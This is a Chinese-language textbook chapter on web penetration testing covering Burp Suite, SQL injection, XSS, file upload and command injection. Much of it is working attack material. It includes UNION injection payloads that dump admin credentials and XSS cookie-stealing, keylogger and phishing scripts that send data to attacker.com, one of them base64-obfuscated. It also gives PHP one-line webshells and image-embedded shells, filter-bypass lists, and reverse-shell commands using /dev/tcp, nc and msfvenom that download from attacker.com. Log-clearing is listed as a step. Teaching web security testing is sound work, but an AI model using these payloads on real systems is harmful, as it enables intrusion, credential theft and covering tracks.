# 第三章 Web渗透测试

> 第3章 | 约60页

## 3.1 Web渗透测试概述

### 3.1.1 Web应用安全现状

Web应用是互联网最重要的组成部分，也是攻击者的主要目标。

**1. Web安全威胁**

```
常见Web安全威胁：

1. 注入攻击
   ├── SQL注入
   ├── 命令注入
   ├── LDAP注入
   └── XML注入

2. 认证与会话管理
   ├── 弱密码
   ├── 会话固定
   ├── 会话劫持
   └── Cookie窃取

3. 跨站攻击
   ├── XSS跨站脚本
   ├── CSRF跨站请求
   └── Clickjacking点击劫持

4. 信息泄露
   ├── 目录遍历
   ├── 敏感文件泄露
   ├── 错误信息泄露
   └── 备份文件泄露

5. 访问控制
   ├── 水平越权
   ├── 垂直越权
   └── 绕过访问控制
```

**2. OWASP Top 10**

```
OWASP Top 10 (2021)：

1. A01:2021 - Broken Access Control
2. A02:2021 - Cryptographic Failures
3. A03:2021 - Injection
4. A04:2021 - Insecure Design
5. A05:2021 - Security Misconfiguration
6. A06:2021 - Vulnerable and Outdated Components
7. A07:2021 - Identification and Authentication Failures
8. A08:2021 - Software and Data Integrity Failures
9. A09:2021 - Security Logging and Monitoring Failures
10. A10:2021 - Server-Side Request Forgery
```

### 3.1.2 Web渗透测试流程

```
Web渗透测试流程：

1. 信息收集
   ├── 目标识别
   ├── 技术栈发现
   ├── 子域名收集
   └── 目录探测

2. 漏洞探测
   ├── 手动测试
   ├── 自动化扫描
   └── 漏洞验证

3. 漏洞利用
   ├── 漏洞原理分析
   ├── Payload构造
   ├── 绕过防护
   └── 获取Shell

4. 权限提升
   ├── WebShell提权
   ├── 系统命令执行
   └── 横向移动

5. 痕迹清理
   ├── 日志清理
   └── 后门清理
```

---

## 3.2 Burp Suite使用

### 3.2.1 Burp Suite介绍

Burp Suite是Web渗透测试中最常用的综合工具平台。

**1. Burp Suite功能模块**

| 模块 | 功能 | 用途 |
|------|------|------|
| Proxy | 代理 | 拦截和修改HTTP请求 |
| Spider | 爬虫 | 自动爬取网站内容 |
| Scanner | 扫描器 | 自动化漏洞扫描 |
| Intruder | 攻击器 | 暴力破解和Fuzz测试 |
| Repeater | 重放器 | 请求修改重发 |
| Decoder | 解码器 | 编码解码工具 |
| Comparer | 比较器 | 比较两次响应差异 |
| Sequencer | 序列器 | 分析随机性 |

**2. Burp Suite配置**

```bash
# 启动Burp Suite
burpsuite

# 或命令行启动
java -jar burpsuite_pro_jar
```

**3. 浏览器代理配置**

```
Firefox配置：
1. 选项 → 网络设置 → 手动代理配置
2. HTTP代理：127.0.0.1
3. 端口：8080
4. 对以下地址不使用代理：localhost, 127.0.0.1

Chrome配置：
1. 设置 → 高级 → 系统 → 代理设置
2. 局域网设置 → 代理服务器
3. 地址：127.0.0.1
4. 端口：8080
```

### 3.2.2 Proxy代理模块

**1. 拦截HTTP请求**

```
拦截设置：
├── Intercept is on/off - 开启/关闭拦截
├── Forward - 放行请求
├── Drop - 丢弃请求
├── Intercept on - 仅拦截特定请求
└── Actions - 更多操作

拦截选项：
├── URL Scope - 拦截范围
├── filetypes - 文件类型
├── 服务端错误 - 拦截服务器错误
└── 请求头 - 拦截特定请求头
```

**2. HTTP历史记录**

```
历史记录功能：
├── 查看所有请求
├── 过滤和搜索
├── 添加注释
├── 标记重要请求
├── 导出请求
└── 比较请求

过滤器选项：
├── 请求方法：GET/POST等
├── MIME类型
├── 状态码
├── 参数类型
├── 搜索关键字
└── 正则表达式
```

**3. 请求/响应修改**

```bash
# 在Proxy中修改请求
1. 拦截请求
2. 修改以下内容：
   ├── URL参数
   ├── POST参数
   ├── 请求头（Cookie、User-Agent等）
   └── 请求体内容
3. 放行修改后的请求

# 修改响应
1. 选择请求 → Response to this request
2. 修改响应内容
3. Forward
```

### 3.2.3 Intruder攻击模块

**1. Intruder攻击类型**

```
攻击类型：

1. Sniper（狙击手）
   ├── 使用一个payload集合
   ├── 依次替换每个参数位置
   └── 适合单一参数攻击

2. Battering Ram（攻城槌）
   ├── 使用一个payload集合
   ├── 同时替换所有参数位置
   └── 适合相同密码攻击

3. Pitchfork（叉子）
   ├── 使用多个payload集合
   ├── 对应位置一一替换
   └── 适合用户名密码组合

4. Cluster Bomb（集束炸弹）
   ├── 使用多个payload集合
   ├── 穷举所有组合
   └── 适合字典组合攻击
```

**2. 配置Intruder攻击**

```bash
# Intruder使用步骤：

1. 发送请求到Intruder
   ├── 拦截请求 → Send to Intruder
   └── 历史记录 → Send to Intruder

2. 配置目标和参数
   ├── Positions标签
   ├── 选择攻击类型
   ├── 标记需要替换的位置

3. 配置Payload
   ├── Payload Sets：选择payload类型
   ├── Payload Options：设置payload
   └── Payload Processing：payload处理规则

4. 启动攻击
   ├── Start Attack
   ├── 查看结果
   └── 分析响应
```

**3. 暴力破解实战**

```
密码暴力破解配置：

1. 发送登录请求到Intruder
POST /login HTTP/1.1
Host: target.com
username=admin&password=§test§

2. 设置攻击类型
选择 Pitchfork（用户名密码组合）

3. 配置Payload
Payload Set 1: 用户名字典
Payload Set 2: 密码字典

4. 设置grep规则
添加 "Login Failed" 标记
找到不包含此标记的即为成功

5. 启动攻击，分析结果
```

### 3.2.4 Repeater重放模块

**1. Repeater使用场景**

```
Repeater适用场景：

1. 手动测试漏洞
   ├── SQL注入测试
   ├── XSS测试
   └── 命令注入测试

2. 分析请求响应
   ├── 查看完整响应
   ├── 分析服务器行为
   └── 测试防护机制

3. 绕过测试
   ├── 测试WAF绕过
   ├── 测试编码绕过
   └── 测试正则绕过
```

**2. Repeater实战操作**

```bash
# Repeater使用步骤：

1. 发送请求到Repeater
   Proxy → 选择请求 → Send to Repeater

2. 修改请求内容
   - 修改参数
   - 添加/修改请求头
   - 改变请求方法

3. 发送并查看响应
   - 点击 "Go" 发送
   - 查看响应内容
   - 分析响应状态码

4. 多请求管理
   - 可以创建多个标签
   - 方便对比测试
```

---

## 3.3 SQL注入漏洞

### 3.3.1 SQL注入原理

**1. SQL注入成因**

```php
<?php
// 危险代码示例
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";  // 直接拼接
$result = mysql_query($sql);

// 攻击者输入
// id=1 UNION SELECT 1,2,3,4--
// 实际执行
// SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3,4--
?>
```

**2. SQL注入分类**

| 类型 | 说明 | 利用难度 |
|------|------|----------|
| UNION注入 | 联合查询 | 简单 |
| 报错注入 | 错误信息回显 | 简单 |
| 布尔盲注 | 页面差异判断 | 中等 |
| 时间盲注 | 延时判断 | 中等 |
| 堆叠注入 | 执行多条SQL | 简单 |
| 二次注入 | 存储后利用 | 复杂 |

### 3.3.2 SQL注入实战

**1. SQLMap自动化工具**

```bash
# 基本使用
sqlmap -u "http://target.com/page.php?id=1"

# 指定数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 指定数据库
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# 指定表
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --columns

# 导出数据
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump

# 交互式Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

**2. SQLMap高级选项**

```bash
# 指定参数
sqlmap -u "http://target.com/page.php" --data="id=1&name=test"

# 指定Cookie（认证后注入）
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=xxx"

# 设置代理
sqlmap -u "http://target.com/page.php?id=1" --proxy=http://127.0.0.1:8080

# 延迟测试（绕过WAF）
sqlmap -u "http://target.com/page.php?id=1" --delay=1

# 随机User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Level设置（检测深度）
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risk设置（利用风险）
sqlmap -u "http://target.com/page.php?id=1" --risk=3

# 指纹识别绕过
sqlmap -u "http://target.com/page.php?id=1" --banner
```

**3. 手动SQL注入**

```bash
# 1. 判断注入点
http://target.com/news.php?id=1' --> 报错
http://target.com/news.php?id=1 and 1=1 --> 正常
http://target.com/news.php?id=1 and 1=2 --> 错误

# 2. 判断字段数
http://target.com/news.php?id=1' order by 5 --+ --> 正常
http://target.com/news.php?id=1' order by 6 --+ --> 错误
# 说明字段数为5

# 3. 联合查询获取数据
http://target.com/news.php?id=-1' union select 1,2,3,4,5 --+

# 4. 获取数据库信息
http://target.com/news.php?id=-1' union select 1,2,database(),4,5 --+

# 5. 获取表名
http://target.com/news.php?id=-1' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=database() --+

# 6. 获取列名
http://target.com/news.php?id=-1' union select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_name='admin' --+

# 7. 获取数据
http://target.com/news.php?id=-1' union select 1,2,group_concat(username,0x3a,password),4,5 from admin --+
```

### 3.3.3 SQL注入绕过技巧

**1. 注释符绕过**

```sql
-- 绕过空格
id=1/**/UNION/**/SELECT

-- 绕过引号
id=0x31

-- 内联注释
id=1/*!UNION*/SELECT
```

**2. 编码绕过**

```sql
-- URL编码
%27 = '
%20 = 空格
%0a = 换行

-- Unicode编码
' = %u0027

-- Hex编码
admin = 0x61646d696e
```

**3. 大小写混合**

```sql
UniOn SeLeCt
OrDeR By
```

**4. 双写绕过**

```sql
oorr --> or
ununionion --> union
```

---

## 3.4 XSS跨站脚本漏洞

### 3.4.1 XSS漏洞原理

**1. XSS原理**

XSS（Cross-Site Scripting）攻击是因为Web应用对用户输入没有充分过滤或转义，导致恶意脚本被浏览器执行。

```html
<!-- 反射型XSS示例 -->
<!-- URL参数未过滤直接输出 -->
http://target.com/search?q=<script>alert(1)</script>

<!-- 存储型XSS示例 -->
<!-- 留言板内容未过滤 -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- DOM型XSS示例 -->
<!-- JavaScript直接使用URL内容 -->
var pos=document.URL.indexOf("name=")+5;
document.write(document.URL.substring(pos,document.URL.length));
```

**2. XSS分类**

| 类型 | 触发方式 | 持久性 |
|------|----------|--------|
| 反射型 | URL参数 | 非持久 |
| 存储型 | 数据库存储 | 持久 |
| DOM型 | 客户端JS | 非持久 |

### 3.4.2 XSS漏洞利用

**1. Cookie窃取**

```html
<!-- Cookie窃取脚本 -->
<script>
  new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<!-- 带过滤绕过的Cookie窃取 -->
<script>
  eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Jytkb2N1bWVudC5jb29raWU7'));
</script>
```

**2. 键盘记录**

```html
<!-- 键盘记录器 -->
<script>
  document.addEventListener('keypress',function(e){
    var img=new Image();
    img.src='http://attacker.com/log?k='+e.key;
  });
</script>
```

**3. 钓鱼攻击**

```html
<!-- 钓鱼弹窗 -->
<script>
  document.write('<form action="http://attacker.com"><input name="pwd"/></form>');
  document.querySelector('form').submit();
</script>
```

### 3.4.3 XSS漏洞检测

**1. 手动检测**

```html
<!-- 基本测试 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>

<!-- 事件触发 -->
<a onmouseover=alert(1)>x</a>
<div onclick=alert(1)>x</div>

<!-- 绕过引号 -->
<img src='x' onerror='alert(1)'>
<img src="x" onerror="alert(1)">

<!-- 绕过括号 -->
<img src=x onerror=alert`1`>
```

**2. 自动化工具**

```bash
# 使用xsstrike
python3 xsstrike.py -u "http://target.com/search?q=test"

# 使用Burp Suite
# 右键 → Extensions → 选择XSS扫描插件

# 使用Nuclei XSS模板
nuclei -u "http://target.com" -t xss.yaml
```

**3. XSS绕过技巧**

```
常见过滤器绕过：

1. 大小写混合
   <ScRiPt>alert(1)</sCrIpT>

2. HTML标签变形
   <img src=x onerror=alert(1)>
   <svg/onload=alert(1)>
   <body/onload=alert(1)>

3. JavaScript伪协议
   <a href="javascript:alert(1)">click</a>
   <iframe src="javascript:alert(1)">

4. data:协议
   <a href="data:text/html,<script>alert(1)</script>">click</a>

5. Unicode编码
   <img src=x onerror=\u0061lert(1)>

6. HTML编码
   <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

---

## 3.5 文件上传漏洞

### 3.5.1 文件上传漏洞原理

**1. 漏洞成因**

```php
<?php
// 危险的上传代码
$uploadfile = $_FILES['upload']['name'];
move_uploaded_file($_FILES['upload']['tmp_name'], "uploads/" . $uploadfile);
?>
```

**2. 常见上传点**

```
常见上传点：

1. 用户头像上传
2. 文档上传
3. 附件上传
4. 富文本编辑器
5. CMS后台文件上传
6. API接口文件上传
```

### 3.5.2 WebShell上传

**1. WebShell类型**

```php
<?php
// 简单一句话木马
eval($_POST['cmd']);
?>

<?php
// assert一句话木马
assert($_POST['x']);
?>

<?php
// 隐蔽一句话
$_POST['0']($_POST['1']);
// 客户端：POST 0=system&1=whoami
?>

<?php
// 使用$_REQUEST自动加载
@eval($_REQUEST['pass']);
?>
```

**2. WebShell工具**

```bash
# 冰蝎WebShell
# 生成：java -jar Behinder.jar
# 冰蝎特点：
#   - 加密传输
#   - 支持多种平台
#   - 自定义加密

# 蚁剑WebShell
# 生成：中国菜刀进化版
# 蚁剑特点：
#   - 图形化界面
#   - 编码器绕过
#   - 多平台支持
```

### 3.5.3 文件上传绕过

**1. 前端绕过**

```javascript
// 绕过前端验证
// 方法1：禁用JavaScript
// 方法2：修改JS代码
// 方法3：Burp Suite拦截修改
```

**2. MIME类型绕过**

```bash
# 修改Content-Type
Content-Type: image/jpeg
# 实际发送PHP文件
```

**3. 文件扩展名绕过**

```
扩展名绕过技巧：

1. 大小写
   .pHp .aSp .jSp

2. 双写
   .phphpp .phtml

3. 特殊扩展名
   .php5 .phtml .phar .pht

4. 空格/点号
   shell.php (空格)
   shell.php. (点号)
   shell.php%00.jpg

5. ::DATA（Windows）
   shell.php::$DATA
```

**4. 文件内容绕过**

```bash
# 添加文件头
GIF89a
<?php eval($_POST['cmd']);?>

# 创建图片马
copy 1.jpg/b + shell.php/a webshell.jpg

# 使用exif数据
exiftool -Comment='<?php eval($_POST[cmd]);?>' 1.jpg
```

**5. 竞争上传**

```
竞争上传原理：
1. 上传PHP文件同时快速访问
2. 利用时间差绕过检测

代码示例：
import requests
url = "http://target.com/upload.php"
while True:
    r = requests.get("http://target.com/uploads/shell.php")
    if r.status_code == 200:
        print("Shell uploaded!")
        break
    files = {'file': open('shell.php', 'rb')}
    requests.post(url, files=files)
```

### 3.5.4 解析漏洞

**1. Apache解析漏洞**

```
Apache解析顺序从右到左：
shell.php.abc.def
解析为：shell.php

.htaccess解析：
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>
```

**2. Nginx解析漏洞**

```
Nginx < 8.03 空字节解析：
shell.jpg%00.php

Nginx fastcgi解析：
shell.jpg/.php
访问此URL会当作PHP执行

CVE-2013-4547：
shell.jpg[空格].php
```

**3. IIS解析漏洞**

```
IIS 6.0解析：
shell.asp;1.jpg
shell.asp;1.txt

IIS 7.x解析：
shell.jpg/.php
```

---

## 3.6 命令注入漏洞

### 3.6.1 命令注入原理

**1. 漏洞成因**

```php
<?php
// 危险代码
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**2. 命令连接符**

```bash
# Linux命令连接符
;   # 执行所有命令
|   # 管道，前命令输出作为后命令输入
||  # 或，前命令失败执行后命令
&&  # 与，前命令成功执行后命令
` ` # 命令替换，执行括号内命令
$() # 命令替换，等同于反引号
\n  # 换行符
```

### 3.6.2 命令注入利用

**1. 基本利用**

```bash
# 测试注入
# ?ip=127.0.0.1;whoami
# ?ip=127.0.0.1|id
# ?ip=127.0.0.1|cat /etc/passwd
```

**2. 获取Shell**

```bash
# 反弹Shell
# Linux
?ip=127.0.0.1;bash -i >& /dev/tcp/attacker/4444 0>&1

# 使用nc
?ip=127.0.0.1;nc -e /bin/bash attacker.com 4444

# 使用Metasploit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf > shell.elf
wget http://attacker.com/shell.elf
chmod +x shell.elf
./shell.elf
```

**3. 命令注入绕过**

```
过滤绕过技巧：

1. 空格过滤
   $IFS  # 内部字段分隔符
   ${IFS}
   <  # 输入重定向

2. 关键词过滤
   cat --> ca''t
   cat --> ca""t
   cat --> cat$@
   cat --> base64解码绕过

3. 命令关键字
   whoami --> $(echo d2hvYW1p|base64 -d)
```

---

## 本章小结

本章介绍了Web渗透测试的核心技术：

1. **Burp Suite工具使用**：
   - Proxy代理拦截
   - Intruder暴力破解
   - Repeater请求重放

2. **SQL注入漏洞**：
   - 注入原理和分类
   - SQLMap自动化利用
   - 手动注入技巧
   - 绕过防护方法

3. **XSS跨站脚本**：
   - 漏洞原理和分类
   - Cookie窃取等利用
   - 检测和绕过技巧

4. **文件上传漏洞**：
   - WebShell上传
   - 多种绕过方法
   - 服务器解析漏洞

5. **命令注入漏洞**：
   - 漏洞原理
   - Shell获取方法
   - 绕过技巧

Web渗透测试需要结合工具和手动测试，才能发现更多深层漏洞。

---

## 思考题

1. 如何使用Burp Suite进行高效的Web渗透测试？
2. SQL注入漏洞有哪些防护措施？如何绕过这些防护？
3. XSS漏洞除了窃取Cookie，还有哪些危害？
4. 文件上传漏洞应该如何防御？仅靠扩展名过滤够吗？
5. 命令注入漏洞和远程代码执行（RCE）有什么区别？
